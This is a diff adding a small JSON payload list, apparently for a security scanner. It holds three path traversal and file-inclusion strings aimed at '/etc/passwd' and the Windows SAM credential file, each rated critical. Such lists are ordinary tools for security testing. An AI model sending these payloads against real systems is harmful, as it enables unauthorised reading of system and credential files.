@@ -1,0 +1,23 @@
+[
+    {
+        "id": "lfi_basic",
+        "name": "Basic LFI",
+        "payload": "../../../etc/passwd",
+        "severity": "Critical",
+        "description": "Local File Inclusion - read system files"
+    },
+    {
+        "id": "lfi_null_byte",
+        "name": "Null Byte LFI",
+        "payload": "../../../etc/passwd%00",
+        "severity": "Critical",
+        "description": "Null byte bypass for file inclusion"
+    },
+    {
+        "id": "path_traversal_windows",
+        "name": "Windows Path Traversal",
+        "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+        "severity": "Critical",
+        "description": "Windows-specific path traversal"
+    }
+]
